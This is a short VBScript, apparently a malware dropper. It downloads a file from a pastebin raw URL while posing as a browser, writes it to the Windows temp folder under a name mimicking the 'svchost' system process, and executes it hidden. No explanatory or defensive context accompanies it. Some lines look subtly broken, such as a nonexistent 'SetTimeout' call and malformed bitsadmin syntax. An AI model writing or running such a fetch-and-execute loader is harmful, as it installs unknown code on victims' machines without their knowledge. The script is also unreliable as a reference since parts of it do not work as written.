Set W=CreateObject("WScript.Shell"):Set F=CreateObject("Scripting.FileSystemObject")
Set X=CreateObject("MSXML2.ServerXMLHTTP"):X.Open "GET","https://pastebin.com/raw/abc123",0
X.setRequestHeader "User-Agent","Mozilla/5.0":X.Send:Set S=CreateObject("ADODB.Stream")
S.Type=1:S.Open:S.Write X.responseBody
G=F.GetSpecialFolder(2):N=G&"\svch"&Replace((CreateObject("Scripting.FileSystemObject").GetTempName),"tmp",".exe")
S.SaveToFile N,2:S.Close
W.Run "bitsadmin /transfer job /priority fg """&N&""" /end",0,False
W.Run N,0,False:SetTimeout 2000,0:N="" 'cleanup
